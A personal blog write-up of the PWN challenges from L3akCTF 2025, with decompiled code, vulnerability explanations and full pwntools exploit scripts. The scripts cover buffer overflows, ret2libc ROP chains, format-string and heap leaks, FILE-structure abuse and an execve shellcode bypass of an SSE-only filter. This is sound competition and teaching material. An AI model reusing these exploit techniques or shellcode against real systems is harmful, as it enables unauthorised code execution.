---
date: 2025-07-13T12:17:38+02:00
# description: ""
# image: ""
lastmod: 2025-07-13
showTableOfContents: true
tags: ["pwn", "writeup"]
title: "L3akCTF 2025 | PWN"
type: "post"
---
![stack](/blog/images/l3ak25/l3ak.png) 

## Overview

This weekend, I played L3ak CTF. Since my team didn’t participate, I created an account to play individually, focusing on solving only the PWN challenges. The difficulty of the challenges ranged from easy to hard, but on average, I would say they were of medium difficulty (considering only the PWN challenges). I managed to solve all of them during the CTF, and I have to say — they turned out to be more fun than I expected.

## Challenges

### Safe Gets

**Safe Gets** is probably the easiest PWN challenge.
It’s a simple buffer overflow with a `win()` function.
Although, there are two catches.

The first one is that the string is reversed, which isn’t really a complication.
We can just reverse our payload, or put a zero byte at the beginning so `strlen(s)` returns 0.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[259]; // [rsp+0h] [rbp-110h] BYREF
  char tmp; // [rsp+103h] [rbp-Dh]
  int n; // [rsp+104h] [rbp-Ch]
  unsigned __int64 i; // [rsp+108h] [rbp-8h]

  gets(s);
  n = strlen(s);
  for ( i = 0LL; i < n / 2; ++i )
  {
    tmp = s[n - 1 - i];
    s[n - 1 - i] = s[i];
    s[i] = tmp;
  }
  puts("Reversed string:");
  puts(s);
  return 0;
}
```
The second catch is that there is a Python wrapper for running the binary,
and it accepts user input with `input()`.
The max length of that input is `0xff`, which should make a buffer overflow impossible.

But Python can accept Unicode characters as input, and they can contain multiple bytes.
Sending them to `gets()` will result in an overflow if we send enough.


```py
BINARY = "./chall"
MAX_LEN = 0xff

# Get input from user
payload = input(f"Enter your input (max {MAX_LEN} bytes): ")
if len(payload) > MAX_LEN:
    print("[-] Input too long!")
    sys.exit(1)
```
Payload just fills the buffer until the return address,
then sends a `ret` to align the stack,
and after that, `win` to get a shell.
```py
ret = 0x40101a

payload = flat(
    b"\x00",
    "ч".encode() * (0x116 // 2),
    b"\x00",
    ret,
    exe.sym.win
)

sl(payload)
ia()
```
Full exploit can be found here: [exploit.py](/blog/scripts/l3ak25/safe_gets.py)

### The Goose

This is also an easy challenge, but a little bit harder than the previous one,
because it doesn't have a `win` function, so **ret2libc** is needed.

The binary is pretty simple. We enter a username, and after that, we guess a number.
If we guess the number correctly, we enter a function with a format string vulnerability (for leaking)
and a buffer overflow (for **ret2libc**).

We can fill up the username with 64 characters, and when it’s printed in `guess()`,
the secret number will be leaked.
```c
char username[64];
int nhonks;

int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int timenow; // eax

  setvbuf(_bss_start, 0LL, 2, 0LL);
  timenow = time(0LL);
  srand(timenow);
  setuser(); // __isoc99_scanf("%64s", username);
  nhonks = rand() % 91 + 10;
  if ( guess() ) // __isoc99_scanf("%d", &guess_); ... return guess_ == nhonks;
    highscore();
  else
    puts("tough luck. THE GOOSE WINS! GET THE HONK OUT!");
  return 0;
}

void highscore()
{
  char buf[128]; // [rsp+0h] [rbp-170h] BYREF
  char s[128]; // [rsp+80h] [rbp-F0h] BYREF
  _BYTE v2[32]; // [rsp+100h] [rbp-70h] BYREF
  char format[80]; // [rsp+120h] [rbp-50h] BYREF

  strcpy(format, "wow %s you're so good. what message would you like to leave to the world?");
  printf("what's your name again?");
  __isoc99_scanf("%31s", v2);
  s[31] = 0;
  sprintf(s, format, v2);
  printf(s);
  read(0, buf, 0x400uLL);
  printf("got it. bye now.");
}
```
After we get past the guessing, we have a format string vulnerability and a buffer overflow.
First, use the format string to get a libc leak,
and after that, do a simple ROP chain to call `system("/bin/sh")` to get a shell.
```py
sla(b"> ", b"A" * 64)
ru(b"A" * 64)
guess = r(1)[0]
sla(b"honks?", i2b(guess))

sla(b"again?", b"%21$p")
ru(b"wow ")
libc_leak = int(ru(b" ", True), 16) - 0x93975
log.success(f"Libc leak: {libc_leak:#x}")
libc.address = libc_leak

pop_rdi = libc_leak + 0x10f75b
ret     = libc_leak + 0x10f75c
binsh   = next(libc.search(b"/bin/sh\0"))

payload = flat(
    b"A" * 0x178,
    pop_rdi,
    binsh,
    ret,
    libc.sym.system
)
sa(b"world?", payload)

ia()
```
Full exploit can be found here: [exploit.py](/blog/scripts/l3ak25/the_goose.py)

### Chunky Threads

When I first saw this challenge, my initial thought was that it must be some kind of race condition,
but actually it isn't (really).

The binary works like this: we can send commands in a large buffer.
The `CHUNK` command creates a new thread and prints, in a loop with a sleep, the given content.
The `CHUNKS` command just sets the maximal number of threads.

In `print`, we have an overflow because the command buffer is bigger than the message buffer.
Also, it does a `memcpy` without zeroing out the last byte,
so we can leak some things from the stack if we don't send a zero byte at the end.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+14h] [rbp-41Ch]
  ssize_t size; // [rsp+18h] [rbp-418h]
  char command[1032]; // [rsp+20h] [rbp-410h] BYREF
  unsigned __int64 canary; // [rsp+428h] [rbp-8h]

  canary = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  memset(command, 0, 0x400uLL);
  curthread = threads;
  printf("%s", title);
  while ( 1 )
  {
    size = read(0, command, 1023uLL);
    if ( size == -1 )
      break;
    parsecmd(command, size);
  }
  for ( i = 0; i <= 9; ++i )
  {
    if ( threads[i] )
      pthread_join(threads[i], 0LL);
  }
  return 0;
}

__int64 __fastcall parsecmd(const char *command, __int64 size)
{
  pthread_t *thread; // rax
  char *endptr[2]; // [rsp+18h] [rbp-18h] BYREF
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  endptr[1] = 0LL;
  endptr[0] = 0LL;
  *(_OWORD *)&pa.sleep = 0LL;
  pa.size = 0LL;
  if ( !strncmp(command, "CHUNKS ", 7uLL) )
  {
    nthread = strtoul(command + 7, 0LL, 10);
    if ( nthread > 0xAu )
      errx(-1, "bad number of threads");
    printf("set nthread to %u\n", nthread);
  }
  else if ( !strncmp(command, "CHUNK ", 5uLL) )
  {
    if ( nthread )
    {
      pa.sleep = strtoul(command + 6, endptr, 10);
      pa.count = strtoul(endptr[0] + 1, endptr, 10);
      pa.src = endptr[0] + 1;
      pa.size = size - (endptr[0] + 1 - (char *)command);
      thread = curthread++;
      pthread_create(thread, 0LL, (void *(*)(void *))print, &pa);
      --nthread;
    }
    else
    {
      puts("no threads remaining");
    }
  }
  else if ( !strncmp(command, "CHONK ", 5uLL) )
  {
    puts(chonk);
  }
  else
  {
    puts("unknown command");
  }
  return 0LL;
}

void *__fastcall print(Arg *arg)
{
  int count; // [rsp+10h] [rbp-60h]
  int seconds; // [rsp+14h] [rbp-5Ch]
  char message[72]; // [rsp+20h] [rbp-50h] BYREF
  unsigned __int64 canary; // [rsp+68h] [rbp-8h]

  canary = __readfsqword(0x28u);
  memset(message, 0, 64);
  count = arg->count;
  seconds = arg->sleep;
  memcpy(message, arg->src, arg->size); // Overflow
  while ( count-- )
  {
    puts(message);
    sleep(seconds); // Sleep can prevent crashing
  }
  return 0LL;
}
```
My exploitation strategy is to leak the **canary** and a **libc** address from the stack,
and after that, perform a **ret2libc** attack by executing `system("/bin/sh")` to get a shell.

I set a large number for the seconds so the binary doesn't crash when the canary is overwritten.
```py
sl(b"CHUNKS 3")
s(b"CHUNK 100 1 " + b"A" * 73)
ru(b"A" * 73)
canary = u64(b'\0'+r(7))
log.success(f"Canary: {canary:#x}")

s(b"CHUNK 100 1 " + b"A" * 88)
ru(b"A" * 88)
libc_leak = u64(r(6)+b'\0'*2) - 0x9caa4
log.success(f"Libc leak: {libc_leak:#x}")
libc.address = libc_leak

pop_rdi = libc_leak + 0x10f75b
ret     = libc_leak + 0x10f75c
binsh   = next(libc.search(b"/bin/sh\0"))

payload = flat(
    b"A" * 72,
    canary,
    0,
    pop_rdi, binsh,
    ret,
    libc.sym.system
)

s(b"CHUNK 1 1 " + payload)

ia()
```
Full exploit can be found here: [exploit.py](/blog/scripts/l3ak25/chunky_threads.py)

### Go Write Where

This challenge is a **Golang** version of challenges with one arbitrary write.
**PIE** is turned off, so we can write some byte value there.

The trick is to notice that the one arbitrary read/write happens inside a for loop,
so if we can change `i`, we get more arbitrary reads/writes.
```c
...
for ( i = 1LL; i > 0; i = prev_i - 1 )
{
    prev_i = i;
...
```
We can change `i` because in **Golang** the stack is actually partially predictable,
looking something like `0xc000???xxx` where `?` is random and `x` is some offset.

![stack](/blog/images/l3ak25/go_stack.png)  

Knowing this, we can change `i` and perform enough arbitrary writes
to write a ROP chain on the stack and get a shell.
```py
i_ptr = int(input("> "), 16) if args.DBG else 0xc00009cdb8
ret_addr = i_ptr + 0x190

pop_rdi = 0x46b3e6
pop_rax = 0x4224c4
mov_rsi_rax = 0x41338f
# 0x000000000047bd2e : pop rdx ; sbb byte ptr [rax + 0x29], cl ; ret
pop_rdx = 0x47bd2e
syscall = 0x40336c
binsh = 0x598f00

payload = flat(
    pop_rdi, binsh,
    pop_rax, 0,
    mov_rsi_rax,
    pop_rax, binsh,
    pop_rdx, 0,
    pop_rax, 0x3b,
    syscall
)

sla(b"r/w): ", b"w")
sla(b"): ", h2b(i_ptr))
sla(b"): ", h2b(len(payload) + 9))

for i, b in enumerate(b"/bin/sh\x00"):
    sla(b"r/w): ", b"w")
    sla(b"): ", h2b(binsh + i))
    sla(b"): ", h2b(b))

for i, b in enumerate(payload):
    print(f"{i}. written")
    sla(b"r/w): ", b"w")
    sla(b"): ", h2b(ret_addr + i))
    sla(b"): ", h2b(b))

ia()
```
Full exploit can be found here: [exploit.py](/blog/scripts/l3ak25/go_write_where.py)

### cosmofile

This challenge is a binary built with **Cosmopolitan Libc**.
The binary is actually pretty simple, and it hints at using some kind of File Structure exploit.
The 'problem' is that the implementation of `fread` and the `FILE` struct
is different from the usual **GLIBC** implementation.

The binary creates a file and writes some strings into it.
There are 3 choices for interaction: printing the content of the file, exiting, and reading into the file structure of that file.
Printing the content of the file uses `fread` into a buffer and then `write` to stdout.
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[4100]; // [rsp+0h] [rbp-1010h] BYREF
  int choice; // [rsp+1004h] [rbp-Ch]
  FILE *f; // [rsp+1008h] [rbp-8h]

  f = fopen("/tmp/cosmofile.txt", "rw+");
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  if ( f )
  {
    fwrite("Here is a secret of the universe:\n... huh?\n", 1uLL, 0x2BuLL, f);
    fwrite("It's not here...", 1uLL, 0x10uLL, f);
    fflush(f);
    rewind(f);
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          choice = read_int();
          if ( choice != (_DWORD)&unk_6E7472 )
            break;
          cosmo_puts("Whoa whoa whoa... you can't just hide the secret of the universe like that!");
          cosmo_puts("Just kidding, that's not really a secret...");
          read(0, f, 0x70uLL);
        }
        if ( choice <= (int)&unk_6E7472 )
          break;
LABEL_12:
        cosmo_puts("Invalid choice. Please try again.");
      }
      if ( choice != 1 )
      {
        if ( choice == 2 )
        {
          cosmo_print("Exiting...\n");
          exit(0);
        }
        goto LABEL_12;
      }
      cosmo_print("Reading from cosmofile:\n");
      fread(buf, 1uLL, 0x1000uLL, f);
      cosmo_puts("Content of cosmofile:");
      write(1, buf, 0x1000uLL);
      cosmo_puts("\nNice, now you can see the universe in a different light!");
    }
  }
  perror("Failed to open file");
  return 1;
}
```
After looking at the `FILE` structure and `fread` for some time, 
I realized it is simpler than the standard implementation.

There is a part of `fread` that calls `readv` on the input buffer and a buffer inside
the structure from the file descriptor inside the struct.

We can use this to read from stdin into an arbitrary buffer.
```c
struct FILE
{
  char bufmode;
  char freethis;
  char freebuf;
  char forking;
  int oflags;
  int state;
  int fd;
  int pid;
  __attribute__((aligned(8))) unsigned int size;
  unsigned int beg;
  unsigned int end;
  char *buf;
  pthread_mutex_t lock;
  Dll elem;
  char *getln;
};

size_t __fastcall fread_unlocked(void *buf, size_t size, size_t count, FILE *f) 
{
    ...
    diff = f->end - f->beg;
    ...
    iov[0].iov_base = buf + diff;
    iov[0].iov_len = count * size - diff;
    ...
    iov[1].iov_base = f->buf;
    iov[1].iov_len = f->size;
    ...
    readv(f->fd, iov, 2);
    ...
}
```
When I initially called printing from the file, I got some leaks and used them to get a stack leak.
After that, I used a file structure overwrite to get an arbitrary read from stdin
and write a ROP chain on the stack.

I tried getting a shell, but it didn't work on remote,
so I just opened the file and called `sendfile` to stdout to get the flag.
```py
sla(b"> ", b"1")
ru(b"of cosmofile:\n")
res = r(0x1000)
while len(res) < 0x1000:
    res += r(0x1000 - len(res))
stack_leak = u64(res[2728:2736]) - 0xec8
log.success(f"Stack leak: {stack_leak:#x}")

fp = FILE()
fp.oflags = 2
fp.beg = fp.end = 0
fp.fd = 0
fp.size = 0x2000
fp.bufmode = 0
fp.buf = stack_leak

sla(b"> ", b"7238770")
sa(b"secret...\n", fp.bytes())

sla(b"> ", b"1")

syscall_ret = 0x4111fa
pop_rsi_rdi_rbp = 0x40401d
pop_rdx_rbx_rbp = 0x427748
pop_rax = 0x40bdf5
flagtxt = stack_leak + 0xe8
mov_r10_rcx_syscall = 0x41710e
pop_rcx_5_oth = 0x4035fe

payload = flat(
    b"A" * 0x1000,
    pop_rsi_rdi_rbp, 0, flagtxt, 0,
    pop_rdx_rbx_rbp, 0, 0, 0,
    pop_rax, 2,
    syscall_ret,
    pop_rsi_rdi_rbp, 4, 1, 0,
    pop_rdx_rbx_rbp, 0, 0, 0,
    pop_rcx_5_oth, 0x50, 0, 0, 0, 0, 0,
    pop_rax, 0x28,
    mov_r10_rcx_syscall,
    b"flag.txt\x00"
)

sa(b"cosmofile:\n", payload)
```
Full exploit can be found here: [exploit.py](/blog/scripts/l3ak25/cosmofile.py)

### Notes++

This is a C++ challenge. It’s kind of a heap challenge, which consists of creating, listing,
setting the content, and displaying the content of notes, which are objects of the classes
`RandomNote`, `FixedNote`, and `DynamicNote`.

I think all the classes are implemented correctly, except for `FixedNote`,
where the content is not zeroed out in the constructor. This is useful to know for leaking some data that isn’t cleared.

I reversed the classes to what they might look like:
```cpp
class Note {
public:
    Note();
    virtual ~Note();
    virtual void displayContent();
    virtual void setContent();
};

class RandomNote : public Note {
    string content;

public:
    RandomNote();
    virtual ~RandomNote();
    virtual void displayContent();
    virtual void setContent();
};

class FixedNote : public Note {
    char content[40];

public:
    FixedNote();
    virtual ~FixedNote();
    virtual void displayContent();
    virtual void setContent();
};

class DynamicNote : public Note {
    string content;

public:
    DynamicNote();
    virtual ~DynamicNote();
    virtual void displayContent();
    virtual void setContent();
};
```
Notes are added in a `vector`, but when accessing an element in that vector,
there’s only an upper bound check, not a lower bound check, since the index is `int64`.
Because of that, there’s a vector underflow with a negative index.
```cpp
std::operator<<<std::char_traits<char>>(&std::cout, "Enter note index to set content: ");
std::istream::operator>>(&std::cin, &index);
std::numeric_limits<long>::max();
std::istream::ignore((std::istream *)&std::cin, 0x7FFFFFFFFFFFFFFFLL, 10);
index_ = index;
if ( index_ >= std::ssize<std::vector<Note *>>(notes) )
goto LABEL_38;
note = **(_QWORD **)std::vector<Note *>::operator[](notes, index);
```
My exploitation strategy is to leak the heap, libc, and binary base addresses
to create a fake `Note` on the heap and access it using a negative index,
gaining arbitrary read/write.
I used that to leak `environ` (a stack leak) and place a ROP chain on the stack.
```py
# dummy chunk to later trigger fastbin consolidation
new_note(3)
set_content(0, b"A" * 0x500)
delete_note(0)
# fill tcache bin and two chunks into fastbin
for i in range(9):
    new_note(1)
    set_content(i) # binary pointers in chunks
for i in range(9):
    delete_note(0)
# creatu large chunk to trigger consolidation
new_note(3)
set_content(0, b"B" * 0x500)

# using FixedNote to get libc and base address leaks
new_note(2)
libc_leak = u64(display_note(1)+b'\0\0') - 0x203b50
log.success(f"Libc leak: {libc_leak:#x}")
libc.address = libc_leak
set_content(1, b"A" * 8)
pie_leak = u64(display_note(1)[8:]+b'\0\0') - 0x52be
log.success(f"PIE leak: {pie_leak:#x}")

# similar idea to leak heap address
new_note(3)
for i in range(9):
    new_note(1)
for i in range(9):
    delete_note(3)
delete_note(0)
set_content(1, b"C" * 0x500)
new_note(2)
set_content(2, b"D" * 0x18)
heap_leak = u64(display_note(2)[0x18:]+b'\0\0')
heap_leak = unprotect(heap_leak)
log.success(f"Heap leak: {heap_leak:#x}")

# expand vector to trigger reallocate so vector is after chunks
for i in range(16):
    new_note(1)

# Fake DynamicNote chunk
fake_note = flat(
    pie_leak + 0x8CA0, # DynamicNote vtable
    libc.sym.environ, # pointer
    0x50, 0x80, # size, capacity
    heap_leak + 0x18 # pointer to fake note at index -31
)
set_content(2, fake_note)
stack_leak = u64(display_note(-31)[:8]) - 0x1e0
log.success(f"Stack leak: {stack_leak:#x}")

fake_note = flat(
    pie_leak + 0x8CA0,
    stack_leak,
    0x50, 0x80,
    heap_leak + 0x18
)
set_content(2, fake_note)

pop_rdi = libc_leak + 0x10f75b
ret     = libc_leak + 0x10f75c
binsh   = next(libc.search(b"/bin/sh\0"))

payload = flat(
    pop_rdi, binsh,
    ret,
    libc.sym.system
)
set_content(-31, payload)

ia()
```
Full exploit can be found here: [exploit.py](/blog/scripts/l3ak25/notespp.py)

### SShEllcode

And the last challenge is a shellcode challenge that only allows SSE instructions
and no memory access (as far as I could tell).

The whole challenge is written in Python but uses `ctypes` for calling libc functions.
Instructions are checked with the Capstone library for disassembling the bytes.
```py
def do_thing(code):
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True

    total_len = len(code)
    consumed = 0

    if len(code) > 0x200:
        exit("Too much stuff")

    for insn in md.disasm(code, 0):
        if X86_GRP_SSE1 not in insn.groups and X86_GRP_SSE2 not in insn.groups:
            print(insn.bytes)
            exit("Whats that fancy instructions")
        for op in insn.operands:
            if op.type == CS_OP_MEM:
                exit("No memory")
        if insn.id == X86_INS_MASKMOVDQU:
            exit("That is a very weird instruction")
        
        consumed += insn.size

    if consumed != total_len:
        exit("I dont know those bytes")
    
    libc = ctypes.CDLL("libc.so.6")
    libc.mmap.restype = ctypes.c_void_p
    libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_size_t]
    addr = libc.mmap(ctypes.c_void_p(0x13370000), 0x1000, 0x7, 0x32, -1, 0)
    if addr != 0x13370000:
        exit("Oops")
    
    ptr = ctypes.POINTER(ctypes.c_char)
    map = ctypes.cast(addr, ptr)
    for ind, i in enumerate(code):
        map[ind] = i
    
    func = ctypes.CFUNCTYPE(ctypes.c_void_p)(addr)
    func()
```
My first idea was to find some SSE instruction with indirect access to memory,
but I didn't find anything, so I started testing things.

Eventually, I looked carefully at GDB and saw that we actually have a memory access instruction.
The bytes `\x00\x00` correspond to the instruction `add byte ptr [rax], al`, which can modify memory. 

![stack](/blog/images/l3ak25/sshellcode.png) 

Another useful thing is that the `r11` register contained the shellcode address,
so we could easily move it to other registers.

My exploitation strategy was to use `add byte ptr [rax], al` to write the instruction `push rbx`,
and by adjusting `rsp`, it would add two more instructions: `xor rax, rax; syscall`,
which are stored in `rbx`.
```
rdi <- 0
rsi <- 0x13370000
rdx <- 0x99b
rbx <- 0x50fc03148
rax <- 0x13370153
rsp <- 0x1337015c
fill to 0x13370151
add byte ptr [rax], al
0x53 -> push rbx
4831c00f05 -> xor rax, rax; syscall
```
I created a function that finds a way to get values into registers
using adds and shifts performed on the `0x13370000` value.

With that, I can get any value I need and perform the exploit.
(The function is a little bit weird because I originally wrote it in a test file
and later added it to the exploit.)
```py
ADDR = 0x13370000

def find_value(val):
    st = 0
    while (ADDR << st) < val:
        st += 1
    st -= 1

    arr = []
    res = ADDR << st
    i = st
    while res != val:
        d = ADDR << i if i >= 0 else ADDR >> (-i)
        if res + d > val:
            i -= 1
        else:
            res += d
            arr.append(i)

    return st, arr


code = '''
xorps xmm1, xmm1
movq rdi, xmm1
movq xmm0, r11
movq rsi, xmm0
psllq xmm0, 6
paddq xmm1, xmm0
'''

st, arr = find_value(0x50fc03148)

for i in arr:
    df = st - i
    if df != 0:
        code += f"psrlq xmm0, {df}\npaddq xmm1, xmm0\n"
    else:
        code += "paddq xmm1, xmm0\n"
    if i == -17:
        code += "movq rdx, xmm0\n"
    st = i

code += '''
movq rbx, xmm1
movq xmm0, r11
movq xmm1, xmm0
'''

st, arr = find_value(0x13370153)

for i in arr:
    df = st - i
    if df != 0:
        code += f"psrlq xmm0, {df}\npaddq xmm1, xmm0\n"
    st = i

code += '''
movq rax, xmm1
psrlq xmm0, 2
paddq xmm1, xmm0
psllq xmm0, 3
paddq xmm1, xmm0
movq rsp, xmm1
'''

for _ in range(17):
    code += "movq xmm1, r10\n"
for _ in range(4):
    code += "xorps xmm2, xmm2\n"

sc = asm(code)
sl(sc.hex().encode())

# execve("/bin/sh", 0, 0) - shellcode
new_sc = b"A" * 0x159 + b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
pause()
s(new_sc)

ia()
```
Full exploit can be found here: [exploit.py](/blog/scripts/l3ak25/sshellcode.py)

## Conclusion

AAll things considered, this CTF was fun. I liked the challenges,
and even though some of them had boring parts, I still had a good time solving them.

Also, it’s been a long time since I fully solved a PWN category (not including baby CTFs)
all by myself. The reason for that is probably because the CTF was medium difficulty
and I played solo without my team.

I hope I helped someone who wanted to read writeups for these challenges,
and thanks for reading.
